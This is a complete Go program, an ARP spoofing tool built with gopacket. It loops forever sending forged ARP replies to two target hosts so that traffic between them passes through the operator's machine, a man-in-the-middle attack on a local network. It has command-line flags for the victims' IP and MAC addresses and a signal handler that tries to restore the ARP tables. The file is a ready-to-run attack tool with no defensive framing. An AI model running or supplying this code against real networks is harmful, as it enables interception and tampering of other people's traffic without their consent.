package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func getMACAddress(ifaceName string) (string, error) {
	// Get the network interface by name
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return "", err
	}

	// Return the MAC address
	return iface.HardwareAddr.String(), nil
}

func arp_spoof(target_ip string, target_mac string, impersonate_ip string, impersonate_mac string, interface_ string) {
	// Define the network interface to use
	iface := interface_

	// Open the network interface for packet capture
	handle, err := pcap.OpenLive(iface, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Define the target IP and MAC addresses
	targetIP := net.ParseIP(target_ip)
	targetMAC, _ := net.ParseMAC(target_mac)

	// Define the IP and MAC addresses to impersonate
	impersonateIP := net.ParseIP(impersonate_ip)
	impersonateMAC, _ := net.ParseMAC(impersonate_mac)
	log.Printf("Spoofing %s (%s) to believe we are %s (%s) on interface %s", target_ip, target_mac, impersonate_ip, impersonate_mac, iface)
	// Create an Ethernet layer
	eth := layers.Ethernet{
		SrcMAC:       impersonateMAC,
		DstMAC:       targetMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	// Create an ARP layer
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   impersonateMAC,
		SourceProtAddress: impersonateIP.To4(),
		DstHwAddress:      targetMAC,
		DstProtAddress:    targetIP.To4(),
	}

	// Serialize the packet
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	gopacket.SerializeLayers(buffer, options, &eth, &arp)
	packetData := buffer.Bytes()

	// Send the packet
	err = handle.WritePacketData(packetData)
	if err != nil {
		log.Fatal(err)
	}
	time.Sleep(1 * time.Second)
}

func restoreOriginalMAC(target_ip string, target_mac string, impersonate_ip string, impersonate_mac string, interface_ string) {
	// Open the network interface for packet capture
	handle, err := pcap.OpenLive(interface_, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening interface %s: %v", interface_, err)
	}
	defer handle.Close()

	// Define the target IP and MAC addresses
	targetIP := net.ParseIP(target_ip)
	targetMAC, err := net.ParseMAC(target_mac)
	if err != nil {
		log.Fatalf("Invalid target MAC address: %v", err)
	}

	// Define the IP and MAC addresses to impersonate
	impersonateIP := net.ParseIP(impersonate_ip)
	impersonateMAC, err := net.ParseMAC(impersonate_mac)
	if err != nil {
		log.Fatalf("Invalid impersonate MAC address: %v", err)
	}

	// Create an Ethernet layer
	eth := layers.Ethernet{
		SrcMAC:       impersonateMAC,
		DstMAC:       targetMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	// Create an ARP layer
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   impersonateMAC,
		SourceProtAddress: impersonateIP.To4(),
		DstHwAddress:      targetMAC,
		DstProtAddress:    targetIP.To4(),
	}

	// Serialize the packet
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	gopacket.SerializeLayers(buffer, options, &eth, &arp)
	packetData := buffer.Bytes()

	// Send the packet
	err = handle.WritePacketData(packetData)
	if err != nil {
		log.Fatalf("Error sending ARP reply: %v", err)
	}

	log.Println("Original MAC address restored successfully")
}
func handleSignals(target_ip string, target_mac string, impersonate_ip string, impersonate_mac string, interface_ string) {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c
		log.Println("Received signal, restoring original MAC address...")
		restoreOriginalMAC(impersonate_ip, impersonate_mac, target_ip, target_mac, interface_)
		restoreOriginalMAC(target_ip, target_mac, impersonate_ip, impersonate_mac, interface_)
		os.Exit(0)
	}()
}

func main() {
	// Define command-line flags
	ipSrc := flag.String("ip-src", "", "Source IP address")
	macSrc := flag.String("mac-src", "", "Source MAC address")
	ipTarget := flag.String("ip-target", "", "Target IP address")
	macTarget := flag.String("mac-target", "", "Target MAC address")

	// Parse the command-line flags
	flag.Parse()

	// Check if all required flags are provided
	if *ipSrc == "" || *macSrc == "" || *ipTarget == "" || *macTarget == "" {
		fmt.Println("Usage: go run main.go -ip-src <IP-src> -mac-src <MAC-src> -ip-target <IP-target> -mac-target <MAC-target>")
		return
	}

	ifaceName := "eth0"

	// Get the MAC address
	macAddress, err := getMACAddress(ifaceName)
	if err != nil {
		fmt.Printf("Error getting MAC address: %v\n", err)
		return
	}

	// Print the parameters and interface information
	fmt.Printf("Source IP: %s\n", *ipSrc)
	fmt.Printf("Source MAC: %s\n", *macSrc)
	fmt.Printf("Target IP: %s\n", *ipTarget)
	fmt.Printf("Target MAC: %s\n", *macTarget)
	fmt.Printf("Interface MAC Address: %s\n", macAddress)

	handleSignals(*ipTarget, *macTarget, *ipSrc, *macSrc, ifaceName)
	for true {
		arp_spoof(*ipSrc, *macSrc, *ipTarget, macAddress, ifaceName)
		arp_spoof(*ipTarget, *macTarget, *ipSrc, macAddress, ifaceName)
	}
}
